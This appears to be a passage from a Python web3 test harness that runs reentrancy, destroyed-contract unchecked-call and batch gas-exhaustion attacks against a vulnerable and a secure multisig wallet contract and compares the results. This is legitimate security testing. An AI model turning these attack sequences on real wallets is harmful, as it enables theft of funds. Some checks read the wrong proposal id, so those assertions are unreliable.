#   MITIGATION EXECUTION (SECURE)

# ---------------------------------

# --- REENTRANCY TEST (Secure) ----

#log_step('REENTRANCY TEST (Secure)')

# --- 1) Propose tx sending TARGET_X_ETH to the attacker contract (on Secure wallet) ---
#print('Proposing transaction (Secure -> attacker)')
#txh_prop_s, rec_prop_s = call_propose(secure, owner_accounts[0], REENTRANCY_ATTACKER_ADDRESS, TARGET_X_ETH)
#print('Propose tx:', txh_prop_s)
#dump_tx_artifact('sec_reentrancy_propose', txh_prop_s, rec_prop_s)

# --- 2) Derive the proposal id (proposalCount - 1) ---
#try:
#    pc_s = secure.functions.proposalCount().call()
#    pid_s = pc_s - 1
#except Exception:
#    pid_s = 0
#print('Derived proposal id (secure):', pid_s)

# --- 3) IMPORTANT: set the proposal id on the attacker BEFORE execution ---
#print('Setting proposalId on attacker contract (for secure test)')
#tx_set_s = re_att.functions.setProposalId(pid_s).build_transaction({
#    'from': attacker_account.address,
#    'nonce': w3.eth.get_transaction_count(attacker_account.address),
#    'gas': 120000,
#    'gasPrice': GAS_PRICE,
#    'chainId': chain_id
#})
#txh_set_s, rec_set_s = send_tx_signed(attacker_account, tx_set_s)
#print('Set proposalId tx (secure):', txh_set_s)
#dump_tx_artifact('attacker_setProposalId_secure', txh_set_s, rec_set_s)

# --- 4) Confirm the proposal with the other owners so it becomes executable ---
#print('Confirming transaction (secure) with required owners')
#confirm_txs_secure = []
#for i, acct in enumerate(owners[1:3], start=1):
#    txh_c_s, rec_c_s = call_confirm(secure, get_owner_account(i), pid_s)
#    confirm_txs_secure.append(txh_c_s)
#    print(f'Confirm tx (secure {i}):', txh_c_s)
#    dump_tx_artifact(f'sec_reentrancy_confirm_{i}', txh_c_s, rec_c_s)

# --- 5) Record balances BEFORE execute (exact wei) for evidence ---
#sec_before_r = w3.eth.get_balance(SECURE_ADDRESS)
#att_before_r = w3.eth.get_balance(REENTRANCY_ATTACKER_ADDRESS)
#print(f'Balances before execute (secure): Secure={eth(sec_before_r)} ETH, Attacker={eth(att_before_r)} ETH')

# --- 6) Execute the proposal (this will call the attacker; Secure should block re-entry) ---
#print('Executing proposal (secure) — should be protected against reentrancy')
#txh_exec_s, rec_exec_s = call_execute(secure, owner_accounts[0], pid_s, gas=2_500_000)
#print('Execute tx (secure):', txh_exec_s)
#dump_tx_artifact('sec_reentrancy_execute', txh_exec_s, rec_exec_s)

# --- 7) Record balances AFTER execute (exact wei) ---
#sec_after_r = w3.eth.get_balance(SECURE_ADDRESS)
#att_after_r = w3.eth.get_balance(REENTRANCY_ATTACKER_ADDRESS)
#print(f'Balances after execute (secure): Secure={eth(sec_after_r)} ETH, Attacker={eth(att_after_r)} ETH')

# --- 8) Compute deltas in wei (safe integer arithmetic) ---
#attacker_delta_wei_s = int(att_after_r - att_before_r)
#secure_delta_wei = int(sec_before_r - sec_after_r)

#print(f'  Attacker delta (secure): {attacker_delta_wei_s} wei ({eth(attacker_delta_wei_s)} ETH)')
#print(f'  Secure delta: {secure_delta_wei} wei ({eth(secure_delta_wei)} ETH)')

# --- 9) Success criteria for Secure: attacker MUST NOT receive >= TARGET_X_ETH ---
#target_wei = to_wei_eth(TARGET_X_ETH)
#if attacker_delta_wei_s > target_wei:
    # attacker got at least the transfer — this is a failure of the secure contract
#    print('Unexpected Scenario Outcome: FAILURE — attacker received funds on Secure wallet (vulnerable behavior!).')
#    summary['reentrancy']['secure_result'] = 'FAILURE_ATTACKER_RECEIVED_FUNDS'
#elif attacker_delta_wei_s == target_wei:
    # secure contract prevented reentrancy (expected)
#    print('UnExpected Scenario Outcome: FAILURE — Secure Contract Atomic Execution guard failed and initial recieve transaction call successful (reentrancy not mitigated as designed).')
#    summary['reentrancy']['secure_result'] = 'FAILURE_ATTACKER_RECEIVED_FUNDS'
#else:
#    print('Expected Scenario Outcome: NO FUNDS WERE TRANSFERRED') 
#    summary['reentrancy']['secure_result'] = 'PASS_NO_FUNDS'

# store details for artifacts
#summary['reentrancy'].setdefault('secure', {})
#summary['reentrancy']['secure'].update({
#    'secure_before_wei': int(sec_before_r),
#    'secure_after_wei': int(sec_after_r),
#    'attacker_before_wei': int(att_before_r),
#    'attacker_after_wei': int(att_after_r),
#    'attacker_delta_wei': attacker_delta_wei_s,
#    'secure_delta_wei': secure_delta_wei,
#    'execute_tx': txh_exec_s,
#    'propose_tx': txh_prop_s,
#    'setProposalId_tx': txh_set_s,
#    'confirm_txs': confirm_txs_secure
#})

# --------------------------------------
#     UNECHECKED EXTERNAL CALL (RECIEVE)
# --------------------------------------

# ---------------------------------
#   ATTACK EXECUTION (VULNERABLE)
# ---------------------------------

#log_step('UNCHECKED EXTERNAL CALL (Vulnerable)')

#EXEC_INDEX = 5
# --- 1) Propose tx sending TARGET_X_ETH to the attacker contract (on Vulnerable wallet) ---
#print('Proposing transaction (Vulnerable -> attacker)')
#txh_prop, rec_prop = call_propose(vuln, owner_accounts[0], SINKHOLE_ADDRESS, TARGET_X_ETH)
#print('Propose tx:', txh_prop); dump_tx_artifact('vul_sink_propose', txh_prop, rec_prop)

# --- 2) Derive the proposal id (proposalCount - 1) ---
#print('Deriving the proposal id')
#try:
#    pc = vuln.functions.proposalCount().call(); pid = pc - 1
#except Exception:
#    pid = 0
#print('Derived proposal id (vulnerable):', pid)

# --- 3) Confirm the proposal with the other owners so it becomes executable ---
#print('Confirming transaction (secure) with required owners')
#for i, acct in enumerate(owners[1:3], start=1):
#    txh_c, rec_c = call_confirm(vuln, get_owner_account(i), pid)
#    print('Confirm tx ({i}):', txh_c); dump_tx_artifact(f'vul_sink_confirm_{i}', txh_c, rec_c)

# --- 4) Execute the proposal (this will activate the malicious recieve function in attacker contract.) ---
#print('Executing proposal (vulnerable) — sinkhole attack should succeed')
#txh_exec, rec_exec = call_execute(vuln, owner_accounts[0], pid, gas=2_500_000)
#print('Execute tx:', txh_exec); dump_tx_artifact('vul_sink_execute', txh_exec, rec_exec)

# --- 5) Record contract state AFTER execute for comparison with secure wallet ---
#proposal_vuln = vuln.functions.getProposal(pid).call()
#vuln_tx_status = rec_exec.status
#summary['unchecked_external']['vuln_executed'] = proposal_vuln[EXEC_INDEX] 
#summary['unchecked_external']['vuln_tx_status'] = vuln_tx_status
#print('Execution Status per Wallet:', proposal_vuln[EXEC_INDEX])
#print('Execution Status per Blockchain:', vuln_tx_status)

# --- 6) VULNERABLE FLOW ASSERTION (After txh_exec_s) ---
# Assert VMS: Proposal is marked executed (CORRUPTED STATE)
#if proposal_vuln[EXEC_INDEX] and vuln_tx_status == 1:
#    print('VMS Divergence Proof: Proposal is marked executed despite external call uncertainty.')
#else:
#    print('VMS Failure: Expected proposal to be marked executed.')

# ---------------------------------
#   MITIGATION EXECUTION (SECURE)
# ---------------------------------

#log_step('UNCHECKED EXTERNAL CALL (Secure)')

# --- 1) Propose tx sending TARGET_X_ETH to the attacker contract (on Secure wallet) ---
#print('Proposing transaction (Secure -> attacker)')
#txh_prop, rec_prop = call_propose(secure, owner_accounts[0], SINKHOLE_ADDRESS, TARGET_X_ETH)
#print('Propose tx:', txh_prop); dump_tx_artifact('sec_sink_propose', txh_prop, rec_prop)

# --- 2) Derive the proposal id (proposalCount - 1) ---
#print('Deriving the proposal id')
#try:
#    pc = secure.functions.proposalCount().call(); pid_su = pc - 1
#except Exception:
#    pid = 0
#print('Derived proposal id (vulnerable):', pid_su)

# --- 3) Confirm the proposal with the other owners so it becomes executable ---
#for i, acct in enumerate(owners[1:3], start=1):
#    txh_c, rec_c = call_confirm(secure, get_owner_account(i), pid_su)
#    print('Confirm tx:', txh_c); dump_tx_artifact(f'sec_sink_confirm_{i}', txh_c, rec_c)

# --- 4) Execute the proposal (this will activate the malicious recieve function in attacker contract.) ---
#print('Executing proposal (secure) — should be protected against sinkhole attack')
#txh_exec_s, rec_exec_s = call_execute(secure, owner_accounts[0], pid_su, gas=2_500_000)
#print('Execute tx:', txh_exec_s); dump_tx_artifact('sec_sink_execute', txh_exec_s, rec_exec_s)

# --- 5) Record contract state AFTER execute for comparison with Vulnerable wallet ---
# Note: Secure execution should result in a REVERT (status=0)
#proposal_secure = secure.functions.getProposal(pid_su).call() 
#secure_tx_status = rec_exec_s.status
#summary['unchecked_external']['secure_executed'] = proposal_secure[EXEC_INDEX] 
#summary['unchecked_external']['secure_tx_status'] = secure_tx_status
#print('Execution Status per Wallet:', proposal_secure[EXEC_INDEX])
#print('Execution Status per Blockchain:', secure_tx_status)

# --- 6) SECURE FLOW ASSERTION (After txh_exec_s) ---
# Note: Secure execution should result in a REVERT (status=0)
# Assert SMS: Proposal is NOT marked executed (SAFE STATE)

#if not proposal_secure[EXEC_INDEX] and secure_tx_status == 0:
#    print('SMS Divergence Proof: Proposal is NOT executed because transaction reverted successfully.')
#else:
#    print('SMS Failure: Secure contract did not revert as expected.')

# ---------------------------------
# UNECHECKED EXTERNAL CALL (IMPLODE)
# ---------------------------------
# This test proves the unchecked external call vulnerability by making the target 
# address a destroyed contract (i.e., address has no code), using Sinkhole.implode(to).

#log_step('UNCHECKED EXTERNAL CALL (Post-Destruction)')

# Both contracts use index 5 for the 'executed' status (6th element)
#EXEC_INDEX = 5 

# ---------------------------------
#        STAGE 1: DESTROY SINKHOLE
# ---------------------------------
#log_step('STAGE 1: DEPLOY & DESTROY NEW SINKHOLE')

# A. Deploy a new Sinkhole contract instance
# The DEPLOYER_ACCOUNT will own the new Sinkhole, so it must be the one to implode it.
#print('1. Attacker is deploying the Sinkhole contract (Implode) and will destroy as well...')
#destroyed_addr, initial_value, txh_implode, rec_implode = deploy_and_implode_sinkhole(attacker_account, attacker_account.address)
#print(f"[INFO] Sinkhole destroyed at: {destroyed_addr}")
#print(f"[INFO] Original contract balance before destruction: {initial_value} wei")
# Verification: The Sinkhole address must have no code for the test to be valid.
#if w3.eth.get_code(destroyed_addr) == b'':
#    print('   VERIFIED: Sinkhole successfully destroyed.')
#else:
#    raise SystemExit('ERROR: Sinkhole not destroyed. Cannot run post-destruction test.')

# ----------------------------------------------
#        STAGE 2: ATTACK EXECUTION (VULNERABLE)
# ----------------------------------------------
#log_step('POST-DESTRUCTION VULNERABLE FLOW')

# --- 1) Propose a 0-ETH call to the destroyed address. The call will fail due to no code. ---
#print('Proposing transaction (Vulnerable -> attacker)')
#txh_prop, rec_prop = call_propose(vuln, owner_accounts[0], destroyed_addr, Decimal('0'))
#pc = vuln.functions.proposalCount().call(); pid_vuln_dest = pc - 1
#print(f'VMS Propose tx: {txh_prop} | PID: {pid_vuln_dest}')

# --- 2) Confirm the proposal with the other owners so it becomes executable ---
#for i, acct in enumerate(owners[1:3], start=1):
#    tx_vs, rxc = call_confirm(vuln, get_owner_account(i), pid_vuln_dest)
#    print('Confirm tx:', tx_vs); dump_tx_artifact(f'vul_sink_dest_confirm_{i}', tx_vs, rxc)

# --- 3) Execute (Expected: TX succeeds at blockchain level, Proposal state is CORRUPTED) ---
#txh_exec_dest_v, rec_exec_dest_v = call_execute(vuln, owner_accounts[0], pid_vuln_dest, gas=2_500_000)
#dump_tx_artifact('vul_sink_dest_execute', txh_exec_dest_v, rec_exec_dest_v)
#print('VMS Execute tx:', txh_exec_dest_v)

# --- ASSERT VULNERABILITY (Divergence Check) ---
#vuln_tx_status = rec_exec_dest_v.status
#vuln_executed = vuln.functions.getProposal(pid_su).call()

#print('Execution Status per Wallet:', vuln_executed[EXEC_INDEX])
#print('Execution Status per Blockchain:', vuln_tx_status)


#if vuln_tx_status == 1 and vuln_executed[EXEC_INDEX]:
#    print('RESULT: VMS is VULNERABLE. Tx Succeeded (Status=1) despite failed call, leading to state inconsistency.')
#    summary['unchecked_external']['post_dest_vuln'] = 'VULNERABLE_CORRUPTED_STATE'
#else:
#    print('ERROR: VMS did not exhibit expected vulnerable behavior (Tx status or executed flag is wrong).')
#    summary['unchecked_external']['post_dest_vuln'] = 'ERROR_VULNERABLE_TOO_SAFE'
#
# ---------------------------------------------
#        STAGE 3: MITIGATION EXECUTION (SECURE)
# ---------------------------------------------
#log_step('POST-DESTRUCTION SECURE FLOW')

# --- 1) Propose a 0-ETH call to the destroyed address. ---
#print('Proposing transaction (Secure -> attacker)')
#txh_prop, rec_prop = call_propose(secure, owner_accounts[0], destroyed_addr, Decimal('0'))
#pc = secure.functions.proposalCount().call(); pid_secure_dest = pc - 1
#print(f'SMS Propose tx: {txh_prop} | PID: {pid_secure_dest}')

# --- 2) Confirm the proposal with the other owners so it becomes executable. ---
#for i, acct in enumerate(owners[1:3], start=1):
#    tvs, rdx = call_confirm(secure, get_owner_account(i), pid_secure_dest)
#    print('Confirm tx:', tvs); dump_tx_artifact(f'sec_sink_dest_confirm_{i}', tvs, rdx)

# --- 3) Execute (Expected: TX REVERTS, Proposal state is SAFE). ---
#secure_tx_status = 0
#txh_exec_dest_s = 'TX_REVERTED'
#try:
    # Attempt to execute. This is expected to throw an exception due to revert.
#    txh_exec_dest_s, rec_exec_dest_s = call_execute(secure, owner_accounts[0], pid_secure_dest, gas=2_500_000)
#    secure_tx_status = rec_exec_dest_s.status
#    dump_tx_artifact('sec_sink_dest_execute', txh_exec_dest_s, rec_exec_dest_s)
#except Exception:
    # This is the expected path on revert.
#    pass

# Get the final executed status (should be False due to the revert)
#secure_tx_status = rec_exec_dest_s.status
#secure_executed = secure.functions.getProposal(pid_su).call()

#print('Execution Status per Wallet:', secure_executed[EXEC_INDEX])
#print('Execution Status per Blockchain:', secure_tx_status)


# --- ASSERT MITIGATION (Divergence Check) ---
#if secure_tx_status == 0 and not secure_executed[EXEC_INDEX]:
#    print('RESULT: SMS is SECURE. Tx REVERTED (Status=0) and proposal is NOT executed. Mitigation successful against dead contract call.')
#    summary['unchecked_external']['post_dest_secure'] = 'SECURE_SAFE_STATE'
#else:
    # If the SMS doesn't revert (status=1) or marks it executed (True), the mitigation failed.
#    print('ERROR: SMS mitigation failed. Tx status or executed flag is wrong (Secure Wallet exhibited vulnerable behavior).')
#    summary['unchecked_external']['post_dest_secure'] = 'FAILURE_VULNERABLE_BEHAVIOR'


# --------------------------------------
#           BATCH EXECUTION TEST
# --------------------------------------

# ---------------------------------
#   ATTACK EXECUTION (VULNERABLE)
# ---------------------------------

small_amt_wei = int( (Decimal(TARGET_X_ETH) * Decimal(10**18)) / Decimal(40) )
owner_addresses = [acct.address for acct in owner_accounts]
proposer_acct = owner_accounts[0]
nonce_manager = NonceManager(w3, proposer_acct.address)
NUM_FILLERS = 17
EXEC_INDEX = 5

log_step('BATCH GAS EXHAUSTION (Vulnerable)')

# --- 1) Propose first batch of small transactions before malicious proposal ---
print('1. Proposing 17 pre-malicious filler proposals (VMS)')
batch_info = []

# build arrays
tos = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
vals = [0 for _ in tos]
datas = [b'' for _ in tos]

# if chain exposes batchPropose, use it; otherwise fallback to individual proposes
if has_batch_fn(vuln, "batchPropose"):
    # defensive resync
    nonce_manager.set_next(max(nonce_manager.peek(), w3.eth.get_transaction_count(proposer_acct.address, "pending")))

    pc_before = vuln.functions.proposalCount().call()
    fn = vuln.functions.batchPropose(tos, vals, datas)
    tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
    txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
    dump_tx_artifact('vul_batch_propose_all', txh_prop, rec_prop)

    # --- 2) Derive the proposal id (proposalCount - 1) ---
    print('Deriving the proposal id')
    try:
        pc_after = vuln.functions.proposalCount().call()
        batch_info = list(range(int(pc_before), int(pc_after)))
    except Exception as e:
        print(f"[WARN] could not compute pids after batchPropose: {e}")
        # fallback: at least push last pid
        try:
            pc = vuln.functions.proposalCount().call()
            batch_info.append(pc - 1)
            print(batch_info)
        except Exception:
            pass
else:
    # fallback: individual proposes (existing behavior)
    for i in range(NUM_FILLERS):
        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
        fn = vuln.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
        try:
            txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
        except Exception as e:
            print(f"[ERROR] propose #{i} failed to send or mine: {e}")
            raise

        print(f'  Propose #{i} tx:', txh_prop)
        dump_tx_artifact(f'vul_batch_propose_{i}', txh_prop, rec_prop)

        # derive pid
        try:
            pc = vuln.functions.proposalCount().call()
            pid = pc - 1
        except Exception as e:
            print(f"[WARN] could not read proposalCount after propose #{i}: {e}; falling back to 0")
            pid = 0
        batch_info.append(pid)
print(f'   {len(batch_info)} filler proposals proposed (VMS).')
print(batch_info)
# --- 3) Propose the malicious reverting transaction (The Attack - VMS) ---
print(' Inserting malicious reverting proposal.')
mal_pid, reverter_addr = deploy_reverting_target_and_propose(vuln, owner_accounts[0], Decimal(0), owners) 
batch_info.append(mal_pid)
print(f'   Malicious Contract Inserted. Malicious PID: {mal_pid}')

# --- 4) Propose 17 more small proposals (Filler 2 - VMS) ---
print(' Proposing 17 post-malicious filler proposals.')
pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
nonce_manager.set_next(max(nonce_manager.peek(), pending))
print(f'   {len(batch_info)} filler proposals proposed (VMS).')
print(batch_info)


# build arrays for post-fillers
tos_post = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
vals_post = [0 for _ in tos_post]
datas_post = [b'' for _ in tos_post]

if has_batch_fn(vuln, "batchPropose"):
    pc_before = vuln.functions.proposalCount().call()
    fn_post = vuln.functions.batchPropose(tos_post, vals_post, datas_post)
    tx_post, rec_post = None, None
    tx = fn_post.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
    txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
    dump_tx_artifact('vul_batch_propose_post_all', txh_prop, rec_prop)

    print('Deriving the proposal id')
    try:
        pc_after = vuln.functions.proposalCount().call()
        batch_info.extend(list(range(int(pc_before), int(pc_after))))
    except Exception as e:
        print(f"[WARN] could not compute post pids after batchPropose: {e}")
        try:
            pc = vuln.functions.proposalCount().call()
            batch_info.append(pc - 1)
        except Exception:
            pass

else:
    for i in range(NUM_FILLERS):
        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
        fn = vuln.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
        try:
            txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
        except Exception as e:
            print(f"[ERROR] propose #{i} failed to send or mine: {e}")
            raise

        print(f'  Propose #{i} tx:', txh_prop)
        dump_tx_artifact(f'vul_batch_propose_post_{i}', txh_prop, rec_prop)

        print('Deriving the proposal id')
        try:
            pc = vuln.functions.proposalCount().call()
            pid = pc - 1
        except Exception as e:
            print(f"[WARN] could not read proposalCount after propose #{i}: {e}; falling back to 0")
            pid = 0
        batch_info.append(pid)

# --- 5) Confirm the proposal with the other owners so it becomes executable ---
print(' Confirming ALL 35 proposals (VMS)')
confirmer1 = get_owner_account(1)
confirmer2 = get_owner_account(2)
nonce_manager_1 = NonceManager(w3, confirmer1.address)
nonce_manager_2 = NonceManager(w3, confirmer2.address)

if has_batch_fn(vuln, "batchConfirm"):
    # use batchConfirm for each confirmer
    nonce_manager_1.set_next(w3.eth.get_transaction_count(confirmer1.address, "pending"))
    txh_c1, rec_c1 = batch_confirm(vuln, confirmer1, batch_info, nonce_manager_1)
    print('Confirm tx (owner1):', txh_c1); dump_tx_artifact('vul_batch_confirm_owner1', txh_c1, rec_c1)

    nonce_manager_2.set_next(w3.eth.get_transaction_count(confirmer2.address, "pending"))
    txh_c2, rec_c2 = batch_confirm(vuln, confirmer2, batch_info, nonce_manager_2)
    print('Confirm tx (owner2):', txh_c2); dump_tx_artifact('vul_batch_confirm_owner2', txh_c2, rec_c2)
else:
    # fallback to individual confirms (existing behavior)
    for pid in batch_info:
        for i, acct in enumerate(owners[1:3], start=1):
            txh_c, rec_c = call_confirm(vuln, get_owner_account(i), pid)
            print('Confirm tx:', txh_c); dump_tx_artifact(f'vul_batch_execute_confirm_{i}', txh_c, rec_c)

# --- 6) Execute the batch (VMS) ---
print(' Executing ALL 35 proposals in a single transaction (VMS)')
txh_exec_batch_v, rec_exec_batch_v = call_batch(vuln, owner_accounts[0], batch_info)
dump_tx_artifact('vul_batch_execute', txh_exec_batch_v, rec_exec_batch_v)

Vuln_Batch_Exec_status = rec_exec_batch_v.status

print('Batch Execution Status:', Vuln_Batch_Exec_status)

# ---------------------------------
#   ATTACK MITIGATION (SECURE)
# ---------------------------------

log_step('BATCH GAS EXHAUSTION (Secure)')

# --- Resolve secure owners on-chain ---
onchain_secure_owners = secure.functions.getOwners().call()
print("\nSecure wallet reports owners:", onchain_secure_owners)

# Map owner addresses -> loaded private keys (must match)
local_key_map = {acct.address.lower(): acct for acct in owner_accounts}

secure_owner_accounts = []
for addr in onchain_secure_owners:
    acct = local_key_map.get(addr.lower())
    if acct is None:
        raise SystemExit(
            f"ERROR: No local private key available for secure owner {addr}.\n"
            "Your secure wallet signer set must match OWNER_PRIVATE_KEYS."
        )
    secure_owner_accounts.append(acct)

# Choose proposers/confirmers directly from resolved list
sec_proposer_acct = secure_owner_accounts[0]
sec_confirmer1    = secure_owner_accounts[1]
sec_confirmer2    = secure_owner_accounts[2]

small_amt_wei = int( (Decimal(TARGET_X_ETH) * Decimal(10**18)) / Decimal(40) )
NUM_FILLERS = 17
EXEC_INDEX = 5
secure_batch_info = []
sec_nonce_manager = NonceManager(w3, sec_proposer_acct.address)
sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")))

# --- 1): Propose 17 small proposals (Filler 1 - SMS) ---
print(' Proposing 17 pre-malicious filler proposals (SMS)')

tos_s = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
vals_s = [0 for _ in tos_s]
datas_s = [b'' for _ in tos_s]

owners_onchain = secure.functions.getOwners().call()
owners_onchain = [w3.to_checksum_address(o) for o in owners_onchain]
print("Secure wallet reports owners:", owners_onchain)

if owners_onchain:
    sec_proposer_acct = None
    for acct in owner_accounts:
        if acct.address in owners_onchain:
            sec_proposer_acct = acct
            break
    if sec_proposer_acct is None:
        raise SystemExit("Local owner private keys do NOT match the secure contract's owners. Fix key mapping.")
else:
    sec_proposer_acct = owner_accounts[0]


if has_batch_fn(secure, "batchPropose"):
    sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")))
    pc_before_s = secure.functions.proposalCount().call()
    fn_s = secure.functions.batchPropose(tos_s, vals_s, datas_s)
    tx = fn_s.build_transaction({"from": sec_proposer_acct.address, "gas": 1_500_000, "chainId": w3.eth.chain_id})
    txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx, nonce_manager=sec_nonce_manager, wait_receipt=True)
    dump_tx_artifact('sec_batch_propose_all', txh_prop_s, rec_prop_s)
    # --- 2) Derive the proposal id (proposalCount - 1) ---
    try:
        pc_after_s = secure.functions.proposalCount().call()
        secure_batch_info = list(range(int(pc_before_s), int(pc_after_s)))
    except Exception as e:
        print(f"[WARN] could not compute secure pids after batchPropose: {e}")
        try:
            pc = secure.functions.proposalCount().call()
            secure_batch_info.append(pc - 1)
        except Exception:
            pass
else:
    for i in range(NUM_FILLERS):
        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
        fn_s = secure.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
        tx_s = fn_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
        try:
            txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx_s, nonce_manager=sec_nonce_manager, wait_receipt=True)
        except Exception as e:
            print(f"[ERROR] secure propose #{i} failed to send or mine: {e}")
            raise

        print(f'  Secure Propose #{i} tx:', txh_prop_s)
        dump_tx_artifact(f'sec_batch_propose_{i}', txh_prop_s, rec_prop_s)

        try:
            pc_s = secure.functions.proposalCount().call()
            pid_s = pc_s - 1
        except Exception as e:
            print(f"[WARN] could not read secure proposalCount after propose #{i}: {e}; falling back to 0")
            pid_s = 0
        secure_batch_info.append(pid_s)

print(f' {len(secure_batch_info)} filler proposals proposed (SMS).')
print(f' PIDs proposed:', secure_batch_info)

# --- 3) Propose the malicious reverting transaction (The Attack - SMS) ---
print(' Inserting malicious reverting proposal on SMS.')

mal_pid_s, reverter_addr_s = deploy_reverting_target_and_propose(secure, owner_accounts[0], Decimal(0), owners) 
pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")))
secure_batch_info.append(mal_pid_s)

print(f'   Malicious Contract Inserted. Malicious PID: {mal_pid_s}')

# --- 4) Propose 17 more small proposals (Filler 2 - SMS) ---
print(' Proposing 17 post-malicious filler proposals on SMS.')

# --- IMPORTANT: re-sync nonce_manager after malicious proposal insertion ---
sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")))
tos_post_s = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
vals_post_s = [0 for _ in tos_post_s]
datas_post_s = [b'' for _ in tos_post_s]

if has_batch_fn(secure, "batchPropose"):
    pc_before_s2 = secure.functions.proposalCount().call()
    fn_post_s = secure.functions.batchPropose(tos_post_s, vals_post_s, datas_post_s)
    tx = fn_post_s.build_transaction({"from": sec_proposer_acct.address, "gas": 1_500_000, "chainId": w3.eth.chain_id})
    txh_post_s, rec_post_s = sign_send(w3, sec_proposer_acct, tx, nonce_manager=sec_nonce_manager, wait_receipt=True)
    dump_tx_artifact('sec_batch_propose_post_all', txh_post_s, rec_post_s)
    try:
        pc_after_s2 = secure.functions.proposalCount().call()
        secure_batch_info.extend(list(range(int(pc_before_s2), int(pc_after_s2))))
    except Exception as e:
        print(f"[WARN] could not compute secure post pids after batchPropose: {e}")
        try:
            pc = secure.functions.proposalCount().call()
            secure_batch_info.append(pc - 1)
        except Exception:
            pass
else:
    for i in range(NUM_FILLERS):
        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
        fn_s = secure.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
        tx_s = fn_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
        try:
            txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx_s, nonce_manager=sec_nonce_manager, wait_receipt=True)
        except Exception as e:
            print(f"[ERROR] secure propose #{i} failed to send or mine: {e}")
            raise

        print(f'  Secure Post Propose #{i} tx:', txh_prop_s)
        dump_tx_artifact(f'sec_batch_propose_post_{i}', txh_prop_s, rec_prop_s)

        try:
            pc_s = secure.functions.proposalCount().call()
            pid_s = pc_s - 1
        except Exception as e:
            print(f"[WARN] could not read secure proposalCount after propose #{i}: {e}; falling back to 0")
            pid_s = 0
        secure_batch_info.append(pid_s)
    print(f'  Secure Propose #{i} tx:', txh_prop_s)


print(f'   {len(secure_batch_info)} filler proposals proposed (SMS).')

# --- 5) Confirm ALL 35 proposals for execution (SMS) ---
print(' Confirming ALL 35 proposals (SMS)')
confirmer1 = owner_accounts[1]
confirmer2 = owner_accounts[2]
sec_nonce_manager_1 = NonceManager(w3, confirmer1.address)
sec_nonce_manager_2 = NonceManager(w3, confirmer2.address)

if has_batch_fn(secure, "batchConfirm"):
    sec_nonce_manager_1.set_next(w3.eth.get_transaction_count(confirmer1.address, "pending"))
    txh_c1, rec_c1 = batch_confirm(secure, confirmer1, secure_batch_info, sec_nonce_manager_1)
    print('Confirm tx (owner1):', txh_c1); dump_tx_artifact('sec_batch_confirm_owner1', txh_c1, rec_c1)

    sec_nonce_manager_2.set_next(w3.eth.get_transaction_count(confirmer2.address, "pending"))
    txh_c2, rec_c2 = batch_confirm(secure, confirmer2, secure_batch_info, sec_nonce_manager_2)
    print('Confirm tx (owner2):', txh_c2); dump_tx_artifact('sec_batch_confirm_owner2', txh_c2, rec_c2)
else:
    for pid in secure_batch_info:
        for i, acct in enumerate(owners[1:3], start=1):
            txh_c, rec_c = call_confirm(secure, get_owner_account(i), pid)
            print('Confirm tx:', txh_c); dump_tx_artifact(f'sec_batch_execute_confirm_{i}', txh_c, rec_c)

# --- 6) Execute the batch (SMS) ---
print(' Executing ALL 35 proposals in a single transaction (SMS) - EXPECT REVERT')

txh_exec_batch_s, rec_exec_batch_s = call_batch(secure, owner_accounts[0], secure_batch_info)
dump_tx_artifact('sec_batch_execute', txh_exec_batch_s, rec_exec_batch_s)
    
Sec_Batch_Exec_status = rec_exec_batch_s.status

print('Batch Execution Status:', Sec_Batch_Exec_status)

ARTIFACT_DIR = ARTIFACT_DIR if 'ARTIFACT_DIR' in globals() else "./artifacts/T-03"
PRECHECK_PATH = os.path.join(ARTIFACT_DIR, "pre_checks.json")
OUT_ASSERTIONS = os.path.join(ARTIFACT_DIR, "assertions.json")

# Replace these names with your actual variables if they differ:
vuln_exec_rec = rec_exec_batch_v
sec_exec_rec = rec_exec_batch_s
vuln_pids = batch_info
sec_pids = secure_batch_info
attacker_addr = os.getenv("ATTACKER_ADDRESS") or (attacker_acct.address if 'attacker_acct' in globals() else None)
target_eth_wei = int(Decimal(TARGET_X_ETH) * 10**18) if 'TARGET_X_ETH' in globals() else to_wei_eth(Decimal("0.1"))

# Helper: load pre-check values (attacker / contract balances)
pre = {}
if os.path.exists(PRECHECK_PATH):
    try:
